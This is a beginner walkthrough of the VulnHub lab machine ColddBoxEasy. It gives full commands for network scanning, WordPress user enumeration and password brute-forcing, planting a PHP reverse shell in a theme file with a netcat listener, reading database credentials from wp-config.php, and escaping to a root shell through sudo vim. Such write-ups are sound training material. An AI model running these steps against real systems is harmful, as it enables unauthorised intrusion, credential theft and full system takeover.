ColddBoxEasy VulnHub Walkthrough

ColddBoxEasy is a beginner-friendly vulnerable machine available on VulnHub.

Download the machine (.ova file) here:
https://download.vulnhub.com/colddbox/ColddBoxEasy_EN.ova

Step 1 — Finding the Target IP
List all active devices on your network:
sudo arp-scan -l
Look for MAC addresses starting with 08:00:27, which usually belong to VirtualBox machines. The last one in the list, 10.0.2.9, is the ColddBoxEasy machine.

Step 2 — Reconnaissance
Scan the target machine using Nmap:
nmap -sC -sV -Pn -T4 10.0.2.9
The scan shows:
Open port: 80 (Apache HTTP server on Ubuntu)
HTTP site title: ColddBox | One more machine
WordPress version: 4.1.31

Open the target IP in a browser to explore the website.

Step 3 — Discover Hidden Directories
Run dirsearch to find hidden directories:
dirsearch -u http://10.0.2.9/
The scan reveals /hidden, /wp-admin, /wp-content, and /wp-includes.

Open /hidden in a browser. A note lists three names: c0ldd, Hugo, and Philip. These are potential usernames.

Step 4 — Enumerate WordPress Users
Use wpscan to confirm usernames:
wpscan --url http://10.0.2.9/ -e u
Confirmed usernames: c0ldd, hugo, philip

Step 5 — Brute Force WordPress Password
Brute-force the password for c0ldd:
wpscan --url http://10.0.2.9/ -U c0ldd -P /usr/share/wordlists/rockyou.txt
Password found: 9876543210

Step 6 — WordPress Admin Access
Log in to the WordPress admin panel at /wp-admin using c0ldd credentials.

Step 7 — Upload Reverse Shell
In the WordPress dashboard, go to Appearance > Editor > 404.php. Paste the PentestMonkey PHP reverse shell code. Update the IP to your machine and port (default or custom).

Step 8 — Set Up Netcat Listener
Start a listener on your machine:
nc -lnvp 1234

Step 9 — Trigger Reverse Shell
Open the 404.php page in a browser:
http://10.0.2.9/wp-content/themes/twentyfifteen/404.php
This executes the reverse shell and connects back as user www-data.

Step 10 — Upgrade to Interactive Shell
Check Python3 and upgrade the shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'

Step 11 — Access WordPress Folder
Navigate to WordPress installation:
cd /var/www/html
Open wp-config.php to find database credentials:
Database name: colddbox
Database username: c0ldd
Database password: cybersecurity

Step 12 — Switch to User c0ldd
Use credentials to switch:
su c0ldd
Navigate to /home/c0ldd and read user flag:
cat user.txt

Step 13 — Privilege Escalation
Check sudo privileges:
sudo -l
c0ldd can run commands like vim, chmod, and ftp as root. Use vim to escape to root shell:
sudo vim -c ':!/bin/sh'
Confirm root access and read root flag:
cd /root
cat root.txt

Step 14 — Summary
Steps completed:
  1.Identify target IP
  2.Scan services and explore WordPress site
  3.Discover usernames and brute-force WordPress login
  4.Upload reverse shell via WordPress theme editor
  5.Switch to system user c0ldd using credentials from wp-config.php
  6.Escalate to root using sudo and vim  
  7.Capture user and root flags
